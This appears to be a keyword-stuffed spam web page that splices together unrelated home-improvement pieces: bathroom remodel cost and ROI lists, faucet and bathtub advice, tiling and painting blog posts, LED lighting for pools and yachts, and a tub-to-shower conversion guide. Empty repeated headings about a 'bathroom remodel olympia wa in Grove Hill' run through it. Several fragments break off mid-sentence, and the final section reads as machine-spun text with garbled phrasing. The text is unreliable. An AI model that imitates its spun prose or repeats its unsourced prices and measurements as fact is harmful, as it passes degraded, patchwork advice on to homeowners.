project of mine, there were prototypes involved</p>    <p>9. The contractor came with his plumber a couple days ago to check out some stuff and the sledgehammers started swinging. He informed me we can start the next day and I get my marching orders to clear out every cabinet in the bathroom as well as the entire master closet. I estimated two hours&#x2026;.it actually took closer to four. We have entirely too much stuff. Realizing just how much stuff we have changed my entire tune about this process from &#x201c;<em>what a pain in the ass&#x201d;</em> to &#x201c;<em>wow, we&#x2019;re awfully lucky to be living a life where remodeling a bathroom is considered a &#x2018;problem&#x2019;</em>&#x201d;</p>    <p>10.

   <div>   <p>For those of us who love a little &#x201c;zing&#x201d; in the bathroom (but not <em>too</em> much), a modern faucet can mean the difference between &#x201c;meh&#x201d; and &#x201c;wow!&#x201d; in every bathroom. The faucet is a fixture that is often overlooked when remodeling a bathroom as most people tend to focus on the larger fittings (bathtub, vanity, sink basin). The right faucet can add flair to an otherwise blah bathroom or complement a stylish one. These are five of my favorites:</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <div>    <p>Artos Twist Single Hole/Single Lever Faucet</p>   <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>   <h2></h2>   <p></p>   </div>   <p>Clean, modern, and simplistic&#x2026; with a (quite literal) twist!

I love the slim lever and wide top. No wonder this one&#x2019;s won design awards!</p>   <p><em>The best lavatory set (and my personal favorite):</em></p>   <div>    <p>Altmans Crystal Widespread Lavatory Set</p>   </div>   <p>The crystal is part of the faucet, so it looks like it&#x2019;s on even when it&#x2019;s not; kind of like an infinite waterfall without the accompanying water bills!

If so, if you could change one thing about your bathroom, what would you like to change? If you are like many other homeowners, there is a good chance that the bathtub was your response. In the United States, there are a fairly large number of homeowners who wish that they had a new bathtub. If you are one of those individuals, did you know that you don&#x2019;t have to wish any longer? If you want a new bathtub, you should get one. Making a new bathtub part of your bathroom remodeling project isn&#x2019;t as difficult as it may seem.</p>   <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>    <p>Perhaps, the first step in choosing a new bathtub is determining how much money you can afford to spend on one. If you are also remodeling the rest of your bathroom, it is important that you not only focus on the cost of a new bathtub, but also the cost of your other supplies. If you mistakenly spend too much on a new bathtub, the rest of your bathroom remodeling plans could suffer. Also, you will likely find that having a bathtub limit or budget is the best way to save time while shopping. Knowing how much money is too much to spend will prevent you from wasting your time, by examining bathtubs that you cannot even afford.</p>   <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>   <h2></h2>   <p></p>    <p>It is also a good idea to determine, ahead of time, how your new bathtub will be installed. If you are planning on having a professional install your new bathtub for you, you will need to keep the extra costs in mind. Although you may want to avoid paying a professional contractor, you may need to. There are a number of bathroom contractors who specialize in replacing bathtubs. In fact, some, literally, just place a new bathtub right over the old one. It may be possible for you to do this yourself, but, in most cases, you will find that a professional contactor could have your new bathtub installed in as little as a few hours.</p>    <h2>Bathroom Remodeling</h2>    <p>Regardless of whether you choose to install your own bathtub or have a professional do it for you, you will need to find a new bathtub to purchase. If you are looking to have your old bathtub completely removed, you will likely find that you have more options. When a new bathtub replaces an old bathtub, the tubs need to be about the same size or style. Therefore, if you are remodeling your bathroom with the hopes of getting a &#x201c;new,&#x201d; bathroom remodel, you may be looking for something different. Luckily for you, you still have an unlimited number of options.</p>    <p>In the United States, the most commonly installed types of bathtubs include traditional ones, which are also known as standard tubs. These bathtubs are often connected right to the wall, placed in a corner, and sit directly on the floor. What is nice about most traditional bathtubs is that they are relatively affordable. You can purchase a traditional bathtub for as low as two hundred dollars. If you are looking for comfort, instead of price, you may want to look into spa-like bathtubs or even massage bathtubs. These bathtubs, as you may assume, cost more than most others. Many massage bathtubs or spa-like bath tubs retail for around one or two thousand dollars. If you are looking for a trendy, stylish bathtub, you may prefer to own a freestanding bathtub. Freestanding bathtubs can cost as low as five hundred dollars, but they can also reach into the thousands.</p>    <p>Once you have decided which type of bathtub you would like to purchase, you will need to decide on a particular tub. Perhaps, the best way to do this is to start your shopping. You may find it easier to make a decision when you can see bathtub displays set up. For a wide selection of bathtubs, including displays, you are advised to checkout one of your local home improvement stores for a complete details on bathroom remodeling.</p>   </div>  </div>

   <div>   <p>Your bathroom is the first thing you see every day. Bleary-eyed and groggy. And you are tired of it! What can you do? First, come up with between $5,649 and $12,938 which is the low-end cost most homeowners can expect to pay for a bathroom makeover in 2016. Then consider the following upgrades many of which can be completed by a handy &#x201c;Do It Yourself&#x201d; enthusiast such as yourself! &#x1f609;&#xde09;</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p> By </p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong>1. Flashy Finishes:</strong> When it is time to upgrade the industrialized look of your bathroom, a new finish to fixtures will put an exclamation point on any bathroom decor. Chrome is still the shiny finish of choice, but the market leader is being elbowed by brass and copper and nickel and oil-rubbed metals. Depending on your taste, a finish can be shiny or matted, or even textured! The customized finishes can run from $40 for chrome to over $500 for nickel fixtures.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p> By </p>   <p><strong>ROI:</strong> Your return on investment is the pleasure you get with handling a beautiful spigot handle several times every day.</p>   <p><strong>2. Fancy Faucets:</strong> You can get a quick jolt to the look of your bathroom with an eye-catching new faucet. Go with a modern update of the classic spouts or search for antique replicas that are constructed from solid brass or nickel. An import from Europe can release your inner avant-garde. Expect to pay many hundreds of dollars more than your average water spout. Put on all the fancy fixings and an new sink complex can run in the range of $5000.</p>   <p> By </p>   <p><strong>ROI:</strong> You may not get all your money back but an updated look on your faucet will absolutely raise the value of your bathroom.</p>   <p><strong>3. Saucy Sinks:</strong> The sink will often be the style leader in any bathroom makeover. A pedestal sink will give a old-timey look to a bathroom as will a console sink with basin and legs. Note the handy lack of under-sink storage space with these models. Textured drop-in sinks impart a contemporary look and feel. A countertop vessel sink with waterspout can make a statement about the American frontier or an upscale European resort. Price options range from $100 and up.</p>   <p> By </p>   <p><strong>ROI:</strong> A sink replacement will likely be part of an overall bathroom decor overhaul which seldom pays for itself.</p>   <p><strong>4. Welcome storage:</strong> It is easy to get carried away with the glamorous options to outfit a bathroom and forget about the importance of storage. A vanity cluttered with cosmetic bottles and stacks of toilet paper on the water closet comprise any decor. New cabinets can cost as much as $2,000 to be installed if a lot of custom woodworking is required for tight spaces and depending on the woods selected. At the low end expect to pay between $1,200 and $3,500.</p>   <p> By </p>   <p><strong>ROI:</strong> The full cost may not be recouped at sales time, but the utility of bathroom storage space is priceless.</p>   <p><strong>5. Elbow Room:</strong> That space premium holds for counter space as well. The days of the double sink have vanished in favor of more counter space. The range of vanities is limited only be the imagination, from high style to refinished salvage models. Installing countertops at the low end will cost between $900 and $2000.</p>   <p><strong>ROI:</strong> New buyers always like to see extra space that can be used to plop things down on. Modestly-priced vanities will likely pay for themselves both in current use and future value.</p>   <p><strong>6. Smart Lighting:</strong> Bathrooms are workspaces above all &#x2013; shaving, makeup application, etc. Lighting should always be functional, but it can be attractive as well. First off, do not put a light above the bathroom mirror since it will cast shadows onto the face. Start by making sure all task lighting is properly oriented over the toilet and shower and then turn to accent lighting and decorative lighting for visual impact. New lighting fixtures can be installed for under $1000 or as much as $4000.</p>   <p> By </p>   <p><strong>ROI:</strong> As soon as a potential homebuyer flips the light switch, the landscape of the lighting is the first thing that makes an impression. If it&#x2019;s done right, it will more than pay for itself.</p>   <p><strong>7. Rub-a-dub-dub:</strong> The first question to be answered about a new bathtub is whether it is even needed. When was the last time you luxuriated in a bath? If you decide to replace the tub upgrades include models from antique claw-foot tubs sunken, ground level extravaganzas which can run into thousands of dollars. At the low range expect to pay between $400 and $1500. At the high end expect to pay between $6000 and $8000.</p>   <p> By </p>   <p><strong>ROI:</strong> Most houses have not completely abandoned the bathtub and still have at least one. But even small kids can be bathed in a portable tub inserted into a shower so whether you ever see money from a bathtub upgrade again will likely depend on the market when the house is sold.</p>   <p><strong>8. Bye-bye-tub:</strong> If the decision is to jettison the bathtub, a shower will free up space for extra utility in the bathroom &#x2013; or extra space in a roomy walk-in shower. You can even find designs that put a tub inside the shower space. So many shower choices, so many price points. Installing a simple shower will cost between $500 and $2000; deluxe models will cost around $10,000.</p>   <p> By </p>   <p><strong>ROI:</strong> See bathtub, elimination. You are going to thrill some buyers with your new bathroom configuration and turn-off others.</p>   <p><strong>9. Counter the countertops:</strong> The popularity of granite and quartz kitchen countertops has invaded the bathroom space. Depending on the size the material and installation costs for bathroom rock will run to several thousand dollars. If you want to fake it, you can spend way less on laminate models but they do scratch and scuff. And you will always know it is not granite &#x2013; and so will potential buyers. High end countertops will cost between $5000 and $6500.</p>   <p><strong>ROI:</strong> Granite countertops will certainly announce that you indeed have a luxury bathroom but they will never pay for themselves at sale time.</p>   <p><strong>10. Breath the air:</strong> A bathroom fan is the best defense against lingering moisture that breeds mold and mildew eating voraciously away at finishes and painted surfaces. Go bigger if your bathroom is larger than 100 square feet or if you have installed options like steam showers. Bathroom fans installed can cost less than $200.</p>   <p><strong>ROI:</strong> When you factor in one less paint job or extra years of life on the finish of bathroom fixtures, a bathroom fan will pay for itself and the electricity needed to run it.</p>   <p><strong>11. Outlet smarts:</strong> We are using way more power in our bathrooms than our ancestors ever dreamed of. Everything from hair dryers to charging phones to music systems. If the electrical outlets in your bathroom are insufficient or inconvenient it not only hampers your way of living but it will surely be noticed by the potential next occupant. The average rate for a licensed journeyman electrician is $54.39 an hour.</p>   <p><strong>ROI:</strong> Converting your bathroom power source into a selling point will likely cover the electrician&#x2019;s bill. &#x1f609;&#xde09;</p>   <p><strong>12. Crown it off:</strong> Many homeowners think that crown moulding is only for large rooms. Think again. Adding trim to a bathroom adds a beautiful architectural touch for little money. Grab a miter saw and install it to dress up even a small bathroom in style. A professional carpenter will charge anywhere from $4 to $8 per linear foot for installing crown moulding.</p>   <p><strong>ROI:</strong> When even the small spaces in your house look like they were created with thought and care, the favorable impression will wash over the entire property.</p>   <p><strong>13. Peek-a-boo:</strong> People just will not get over their modesty about using the toilet. Hiding the water closet in the bathroom has become a fashionable upgrade option. Building a half-wall is often the answer if you don&#x2019;t have space to create a separate room. Framing and dry-walling a small hide-away can be done for surprisingly little money &#x2013; just a few hundred dollars in most cases.</p>   <p><strong>ROI:</strong> That extra little bit of privacy may very well be a selling point for the next owner.</p>   <p><strong>14. Put a tile on it:</strong> Decorative ceramic tile can enhance a bathroom space on the floor, on the walls, and on the vanity. If you do it yourself the material cost will only run a couple of hundred dollars, depending on how much space you are covering. Make sure you have an excellent tile cutter due to the odd spaces encountered in covering bathroom surfaces. Try and use large 18 square inch tiles as this will help reduce the number of grout lines which saves labor and cuts down on chances to mess up the work. The cost of hiring a professional tile installer is between $10 and $15 per square foot. A 12-inch tile can be had for a little more than a half-dollar a square foot or several dollars a square foot. An 18-inch tile costs about a quarter more at the low end and around $5 a square foot at the high end.</p>   <p><strong>ROI:</strong> Professional installation will bump the price beyond recovery. If you are more concerned with selling your house than living in it, go conservative on the tile style.</p>   <p><strong>15. Coat of Paint:</strong> Painting the walls will immediately freshen any bathroom, even if it is not part of a grand makeover scheme. Consider an accent wall with a bright color to offset the other walls. For a quality professional painter expect to pay at least $75 an hour, plus materials.</p>   <p><strong>ROI:</strong> A paint job always pays for itself, usually even if the work is contracted out. Again, do not go big and bold if you are looking to sell. Let the next owners inflict their own design pain on the bathroom.</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>   <div>    <h3><em>Related</em></h3>   </div>  </div>

   <div>   <div>    <h1>Bellevue Condominium Bathroom Makeover</h1>   </div>   <div>    By David Boller, on December 15th, 2010   </div>   <div>    <p>This Bellevue condominium project started out as just a water closet remodel and evolved into a total master bath/bedroom makeover. The worn bathtub was replaced with a Maax acrylic tub and Moen fixtures. The tub surround and custom built vanity counter top were acrylic. To reduce the cold feel of tile a Nuheat heat mat was installed under the tile. The highlight of this project was creating custom shelving in the water closet to look like a window.</p>   <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>   <h2></h2>   <p></p>   </div>  </div>  
   <div>   <p><em>This is part of our ongoing series following a Kitchen Warehouse customer&#x2019;s kitchen and bath remodel project. .</em></p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>On the tile work in the bathroom, we were asked to pick the tiles. However on the installation day, the contractor asked us about the layout of the tiles. Here is an example of the lining up they wanted to do which is a staggered patter. However, given that we really wanted to do a modern kitchen and bath, I really wanted to do a linear patter (straight up and down). The contractor at first suggested we not do that since most walls are not even and you can end up with unusual corners. However he went the extra mile and measured our walls and agreed it would probably be okay since the walls of the bathroom were newly made.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>In addition he asked me about grout color. The key here is that there are a million choices but you want to be sure the grout you choose goes with all the tiles you are integrating. In our case, since I wanted a linear design, a darker or lighter tile would have created another set of lines that would make the room look smaller. We opted for a grout that minimized the effect and a thin grout to keep from having it look as broken up.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>Here is a photo of our layout in the shower. I think we made some good choices. Note that we used a different floor material on the shower than the rest of the floor. This added a bit of depth to the shower which again made the room look bigger than it is.</p>   <p>Continue watching our blog for more entries to keep you up to date on the progress.</p>   <div>    <div>     <h3>Share this:</h3>    </div>   </div>  </div>

If you&#x2019;re stuck for ideas, your remodeling contractors can help you choose what will work best and fit within your range.</p>   <h3>How it will work</h3>   <p>Once you&#x2019;ve decided to take the leap and improve your life by remodeling your bathroom, you will want to begin researching local bathroom remodeling contractors. Before making a final decision, we strongly recommend reading online reviews and checking the company&#x2019;s record with the Better Bureau. The last thing you want is a remodeler who isn&#x2019;t trustworthy or reliable.</p>   <p>Once you&#x2019;ve selected a company, you&#x2019;ll usually go through the following process:</p>   <ol>    <li>Before you meet with your contractors, you&#x2019;ll want to make a preliminary list of what you&#x2019;re looking for in your new bathroom. Are there certain fixtures you&#x2019;re looking to replace? Do you want a larger bathroom? Are there certain colors and styles you&#x2019;re aiming for? That should all go on the list.</li>    <li>Next, you&#x2019;ll have your first meeting with the contractors. You&#x2019;ll share your wish list with them, and you&#x2019;ll also tell them what kind of budget you&#x2019;re working with. You&#x2019;ll also want to provide some photos of the current layout of your bathroom.</li>    <li>The contractors will take all the information you&#x2019;ve given them and begin designing your new bathroom. They will use pricing charts and sophisticated computer imaging technologies to help give you an idea of how your bathroom will look and what kinds of materials will be used.</li>    <li>You&#x2019;ll meet with them again, go over the blueprints, and make your final selection of the material and layout.</li>    <li>Contractors will begin construction. During construction, they will minimize disruption to your daily life.</li>    <li>Construction is finished. The construction crew will be sure to clean up after themselves, and a final inspection will make sure that everything meets safety specifications.</li>    <li>You can enjoy your newly remodeled bathroom.</li>   </ol>   <p>If you&#x2019;re worried about how long the construction will last, don&#x2019;t be. Small bathroom remodeling projects can take as little as a day, while larger remodels that renovate the entire bathroom almost never last more than a week. In short, you can have the bathroom you&#x2019;ve always wanted in less time and at a lower cost than you may have imagined.</p>   <p>Whether you want to redo your entire bathroom or simply update a few of your fixtures, your bathroom remodeling professionals can take care of it for you.</p>   <p>By Tim Crain.

Avoid a renovation disaster; Sears Home Services offers the following advice when thinking about doing a remodel yourself.</strong></p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>DIY renovations are not for the faint of heart. &#x201c;Almost everything in the bathroom has a mechanical rough-in to it, and there are plumbing, space and ventilation issues to consider,&#x201d; says Maria Stapperfenne, president of the National Kitchen &amp; Bath Association. Whether you use a professional or are making relatively straightforward DIY tweaks, like replacing a toilet or changing out a vanity for one that&#x2019;s the same size, it&#x2019;s good to know what lies ahead.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong>Money Matters</strong> &#x201c;Most people don&#x2019;t budget enough money for their project,&#x201d; says Joe Maykut, director of product management at Sears Home Improvement. &#x201c;The bathroom is second only to the kitchen in costs for renovation.&#x201d; And it&#x2019;s not just the drool-worthy products and finishes that add dollars. Be prepared for unforeseen work. &#x201c;Water can infiltrate behind walls in a shower and tub area for years, causing damage not seen from the finished sides of the walls,&#x201d; Maykut warns.</p>  <h2>bathroom remodel olympia wa in Grove Hill - A word of advice</h2>  <h2></h2>  <p></p>   <p><strong>Make a Plan</strong> The bathroom has to be functional, so upfront planning is crucial. Here are some things to consider.</p>   <ul>    <li><strong>Accessibility and safety:</strong> Consider vanity and toilet heights and the space around a toilet. This is especially important if there&#x2019;s a user in a wheelchair. Choose slip-resistant flooring &#x2014; something textured for traction. A zero-threshold shower will help to avoid tripping hazards. If there are to be handholds or grab bars, you may need blocking in the walls. (Although there are new products that have special anchoring systems so no blocking is necessary.)</li>    <li><strong>Space:</strong> The double sink you covet might not fit. &#x201c;In a traditional vanity configuration, you don&#x2019;t want to go under 5 feet,&#x201d; Stapperfenne says. There are some integrated double sinks, but they &#x201c;tend to be contemporary in design&#x201d; and may not fit your d&#xe9;cor.</li>    <li><strong>Easy maintenance:</strong> White grout will show traffic patterns. Stapperfenne suggests a pewter or medium grey grout. While a marble counter is de rigueur, it also is soft and requires sealing to prevent it from staining.</li>   </ul>   <p><strong>Installation Issues</strong> Think it&#x2019;s easy to swap one fixture for another? Think again. Changing the toilet means seating it properly on the wax ring so you don&#x2019;t get leaks. Installing a shower means pitching the drain pan or floor correctly. For a sink, the drains have to be properly oriented to prevent the backup of sewer gases. Want multiple body sprays in the shower? You&#x2019;ll need a thicker supply line to deliver the necessary water volume, and you&#x2019;ll have to correctly size your drain for the water&#x2019;s evacuation. For a truly successful full bathroom renovation, know when to . &#x201c;It&#x2019;s really too detailed a space to do yourself,&#x201d; Stapperfenne says. &#x201c;It can be overwhelming.&#x201d;</p>  </div>

   <div>   <p>[AFG_gallery]</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <h2>Outdoor LED Lighting</h2>   <p>Accurate LED was contacted by the home builder to design and install a tasteful use of LED lighting for the exterior dock stairway, which required a very low profile fixture installed under each step. Inside the house, a large slab of agate hangs from the living room wall. It&#x2019;s lit from behind with an array of LEDs. In the kitchen, the cabinets and display shelves are lit with low profile LEDs.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <h2>Bathroom LED Lighting</h2>   <p>A bathroom remodel gets cutting edge lighting design.&#xa0;This bathroom would have been a striking design on its own, but the addition of LED strip lighting really set it off. Strip lighting was installed in the shelves above the counter top. Small grooves were cut into the top of the shelves in order to recess the rigid strips, and the wires were carefully threaded through a small drilled hole in the shelving, so no wiring was visible. Another strip light was installed underneath the floating cabinetry, to cast a soft glow on the floor.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p>The hand blown glass counter top was illuminated with electroluminescent tape, or EL tape. This is a paper thin layer of glowing material on a flexible backing. It was attached to the wall behind the glass, which carries the light to the uneven edges of the hand made glass material. Also, bubbles and imperfections in the glass glow with the color of the tape light for an amazing effect.</p>   <h2>Pool LED Lighting</h2>   <p>This pool area is a paradise for the neighborhood kids as well as their parents. The sitting walls in the sunken kitchen area glow with blue light. The tiny LEDs are tucked under the coping. The stairways to the raised pool area are also lit. The large waterfall is accented with LEDs, turning the tropical foliage into a glowing pattern of light and shadow. Outside the screen, palm trees are highlighted with green LED bulbs retrofitted into standard landscape fixtures.</p>   <h2>LED Landscape Lighting</h2>   <p>Elegant architecture, highlighted by landscape fixtures. Many landscape lighting designs like this one can be successfully retrofitted to LED bulbs. This lighting system was originally designed by Accurate LED for use with halogen bulbs, but an LED retrofit reduces the electrical load by as much as 85%. This results in lower electric bills for the homeowner and less wear on the wiring and fixtures due to lower amperage and heat. Longer bulb life is an added benefit.</p>   <h2>LED Yacht Lighting</h2>   <p>Cove areas around this yacht accent the rich maple and elegant furniture.&#xa0;The yacht also features over 120 interior light fixtures mounted into the ceiling. They originally each required a 20w halogen bulb, which produced heat and significantly loaded the battery charging system, but Accurate LED had the solution to solve these problems. Each bulb was replaced with a 2.5w LED module, cutting energy use by 80% with no change in light color or intensity. The LED design is friendlier to both the air conditioner and the battery system.</p>   <p>&#xa0;</p>  </div>  
   <div>   <p><strong>We started our upstairs makeover &#x2013; first by <em>painting our oldest son&#x2019;s&#xa0; childhood bedroom,</em></strong><strong> which will become our temporary bedroom while we remodel our master bedroom &#x2013; and then the&#xa0; <em>main bathroom, hallway, and stairs</em> that connects them all.</strong> I realized that we&#x2019;ve painted that bathroom four times in 22 years; once just a few weeks apart because the pink I picked out rivaled Pepto Bismol pink.&#xa0; I added plenty of white to that gallon of pink and lived with the resulting baby pink for a few years.&#xa0; Not long after I painted the tiny bathroom sand and then wallpapered stripes and fish on the lower half.&#xa0; Hey, I had young boys, I was trying to put in something they&#x2019;d like that matched the pink floor and back then wallpaper was all the rage.&#xa0; I wallpapered everything back then.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong>I pulled down that wallpaper last week. </strong>Thank goodness for the <em><strong>Zinsser&#xae; Paper Tiger Wallpaper Scoring Tool</strong></em> ($10.49 at Ace Hardware), best invention ever!&#xa0; That and a spray bottle of warm water was all that was necessary. Skip their gel wallpaper remover unless you&#x2019;re dealing with paper before the 1980&#x2019;s.&#xa0; After the 80&#x2019;s warm water works beautifully for most stripping needs.&#xa0; I did purchase their <em><strong>Zinsser&#xae; Paper Scraper&#xae; Wall Paper Remover &amp; Scraper </strong></em> thinking it would save my fingernails; unfortunately we have textured walls so it was pretty useless and just pulled off the top layer of paint along with the paper.&#xa0; I&#x2019;d skip it and save the $10 unless you have flat walls.</p>  <h2>Getting the most out of bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <p><strong>After pulling it down we were left with the sizing I so patiently painted on the walls all those years ago.</strong> Many people don&#x2019;t bother with this step when putting up wallpaper so you won&#x2019;t always have this issue.&#xa0; I on the other hand, follow directions so there was a generous layer left behind.&#xa0; We tried soap and water &#x2013; no effect.&#xa0; I searched the internet for help and came upon vinegar as a solution &#x2013; didn&#x2019;t work.&#xa0; I broke down and tried bleach which I&#x2019;m vehemently against using &#x2013; it didn&#x2019;t work .&#xa0; I resorted to TSP, again totally against using, so the hubby washed down the walls and then rinsed them.&#xa0; He has no issues with strong chemicals, but he did wear gloves and made sure it was well ventilated.&#xa0; Sorry, for some reason I didn&#x2019;t take any photos of the stripping and washing &#x2013; it was a messy job and it never occurred to me to take photos.&#xa0; Next time I&#x2019;ll cover the floor with plastic first to make cleaning up easier.</p>  <h2>Top ideas for bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <div>    <p>The bathroom before....the after is going to take a few weeks.</p>   </div>   <div>    <p>Martha Stewart Living Spring MELT not mist Paint - OOPS!</p>   </div>   <p><strong>Next we took to painting.</strong> Remember I told you I&#x2019;ve fallen in love with <em><strong>Martha Stewart Living Low-VOC paint</strong></em>?&#xa0; Well, I took a trip back to Home Depot and picked out another color which was suggested by the <em><strong><strong>Home Depot Room Visualizer</strong></strong></em>.&#xa0; The color, a cool and icy green called <em><strong>Spring Melt</strong></em> (MS114), is perfect and coordinates beautifully with <strong>Martha Stewart</strong>&#x2018;s <em><strong>Rice Paper</strong></em> (yellow) and <strong>Martha Stewart</strong>&#x2018;s <em><strong>Sunken Pool</strong></em> (teal) we selected for the hallway right outside.&#xa0; I also picked up <strong>Martha Stewart</strong>&#x2018;s <strong>Tailor&#x2019;s Chalk</strong> (white &#x2013; MSL001) in semi-gloss for the trim and cabinet.&#xa0; The accent colors (as decided right this minute) for the ceiling and accessories will be pale steel gray (to coordinate with my other son&#x2019;s bedroom which is off the same hallway &#x2013; probably <em><strong>Cumulus Cloud</strong></em> or <em><strong>Heavy Goose</strong></em>) and the Rice Paper.&#xa0; At least I think so. I&#x2019;m going for a zen, spa feel without being too themey &#x2013; so no pictures on the wall of someone having a facial &#x2013; but something that feels calm and relaxing.&#xa0; Sure, we still have to deal with the pink floor for awhile, but the green blends beautifully.</p>   <p><strong>Oh, and while I was a Home Depot I was standing next to the cutest young couple looking at the Behr paint</strong>. Now I used to LOVE Behr, but now I prefer a low-VOC paint for my home.&#xa0; I couldn&#x2019;t help myself, they looked so confused, so I walked up and gave them my unsolicited advice about the Martha Stewart. My husband would be mortified, but not surprised if he knew.&#xa0;&#xa0; I&#x2019;m sure they left the store talking about the crazy lady hanging out in the paint department (to be fair, I was waiting for my paint, not stalking buyers &#x2013; giggle).&#xa0; They did take my advice and were going home to use the <strong>Home Depot Room Visualizer</strong> to help them coordinate colors.&#xa0; It works for all of the brands Home Depot carries. So maybe I&#x2019;m not so crazy after all!</p>   <p><strong>Next I&#x2019;m going to start picking out accessories. </strong>Yikes!&#xa0; Who knew there were so many choices!&#xa0; I&#x2019;m going to post some of the choices here and hope you&#x2019;ll help me put it all together.</p>   <p>:me:</p>   <h6>Related posts about our bathroom makeover&#x2026;</h6>   <ul>    <li>Wordless Wednesday &#x2013; Our Painted Pup (miscfinds4u.com)</li>    <li>I Painted My 1970&#x2032;s Master Bedroom Bathroom Counter And I Love It (miscfinds4u.com)</li>    <li>Remodeling with Retirement In Mind After 22 Years In Our Home (miscfinds4u.com)</li>    <li>Martha Stewart Living Low VOC Paint Is My New Favorite!

The American Institute of Architects states that the tub-less bathroom is growing in popularity. Its annual House Design Trends Survey discovered that more than 60 % of homeowners liked a stall shower without a tub in 2013. Compare that to 49 % in 2012, the very first year they specifically surveyed about tub-less bathrooms.</p>  <h2>Where to find more information on bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <h2>The conclusion?</h2>   <p>Go ahead and transform your old tub or tub/shower combination into a cool, walk-in shower, as long as another bathroom in your home has a tub for jobs such as bathing small children.</p>  <h2>Talking about bathroom remodel olympia wa in Grove Hill</h2>  <h2></h2>  <p></p>   <h2>Do You Need to Transfer Your Shower?</h2>   <p>If you&#x2019;re preparing an easy conversion (not a complete restroom transformation), then your project is straightforward.</p>   <p>If your old tub is in an alcove, you can remove it and be entrusted an area that&#x2019;s about 30 to 34 inches deep and 5 feet broad&#x2013; an excellent area for a shower. With minor modifications, your water supply and drain lines will already remain in location, conserving you money on plumbing costs.</p>   <p>If you have a free-standing tub, a bit more preparation may be included. Many free-standing tubs are positioned under or near windows&#x2013; and you&#x2019;ll wish to prevent windows in your new shower enclosure.</p>   <p>That indicates putting your shower in a different area. You&#x2019;ll want to have it as close as possible to the existing water supply and drain lines to keep plumbing costs low. Moving plumbing to a new area can include hundreds of dollars to your project.</p>   <h2>Will Your Dream Shower Fit?</h2>   <p>Most building codes say the floor of a shower stall should be at least 30-inches-by-30 inches. A 36-inch-by-36-inch-wide stall is recommended by the National Kitchen and Bath Association (NKBA). If you&#x2019;re developing to the NKBA standards, an existing tub alcove most likely needs modification&#x2013; such as adding short areas of wall&#x2013; making the finished shower space 36 inches deep.</p>   <p><strong>Other crucial measurements:.</strong> Finished ceiling height: At least 80 inches. Range from side of toilet to shower wall: 15 inches minimum determined from the center of the toilet to the wall; 18 inches is suggested. Distance from front of toilet to shower wall (or any wall): 21 inches minimum measured from the front of the toilet bowl to the wall; 30 inches is suggested. Shower door swing: Must clear all blockages, particularly the toilet and vanity cabinet. Moving glass doors or shower drapes can assist solve door swing issues. Related: Do not Make These Common Improvement Mistakes.</p>   <h2>Tear out&#xa0;Suggestion.</h2>   <p>Eliminating your old tub might not be simple. If it&#x2019;s in good condition, you might offer it online or contribute it to a resell&#xa0;outlet.</p>   <p><strong>During tear-out, you ought to:</strong></p>   <ul>    <li>Examine the condition of existing pipelines and change if essential.</li>    <li>Inspect framing and sub-floor for mold, mildew, and rot, and repair as required.</li>    <li>Make certain your shower valve remains in good condition&#x2013; now is the time to upgrade to a single-handle, pressure-balancing valve that controls temperatures and volume ($100 to $160).</li>   </ul>   <h2>The Shower Floor: Curbs or Curbless?</h2>   <p>The floor of your shower (aka the shower pan) has a lot to say about the design and cost of your conversion. You have an option of two fundamental kinds of pan: one corrals water with curbs that you step over as you enter; the other is curbless.</p>   <p>Shower pans with curbs form a total enclosure to consist of water spray and channel it to a drain. The floor of the shower pan has the appropriate pitch to drain water. Showers with curbs are usually easier and less expensive to install than curbless setups.</p>   <p>Curb less shower stalls (aka barrier-free showers) are very sleek&#xa0;but harder to make&#x2013; the drainage slope of the floor needs to be constructed listed below the level of the surrounding flooring surface. That indicates either raising the level of the surrounding floor, or decreasing the shower pan.</p>   <p>If you raise the restroom floor, it&#x2019;ll be higher than other floor that it satisfies, such as the floor of your bedroom. You&#x2019;ll need a change threshold, which can be uncomfortable and defeats the advantage of curbless shower if you&#x2019;re wishing to be able to roll in a wheelchair.</p>   <h2>What are the Options?</h2>   <p>Shower stall kits are low-cost options. They&#x2019;re typically made of acrylic or fiberglass, and include pre-made sides, a skid-proof floor pan with curbs and a drain hole, and a hinged glass door. They&#x2019;re made to suit corners and old bath tub.</p>   <p>The smooth, specific pieces make kit setup quickly and fairly simple. The shower pan has curbs to consist of water and an integrated slope for drainage. Kits are made in different sizes to fit all sorts of setups, and some consist of extras such as built-in seats and racks for bath items.</p>   <p>You can also find curbless kits, but the requirements are the same&#x2013; you&#x2019;ll either have to raise the level of the restroom floor, or lower the floor of the kit for a seamless shift.</p>   <p>Tiled showers with curbs are built on site. The curbs generally are made with flat two-by-fours stacked on top of each other and finished with ceramic tile. Either a strong or glass wall sits atop the curbs.</p>   <p>Shower pans for use with tile are one-piece acrylic or fiberglass, or custom-made from poured mortar. The mortar is sloped by hand towards the drain, then covered with a water resistant rubber or vinyl membrane. Another layer 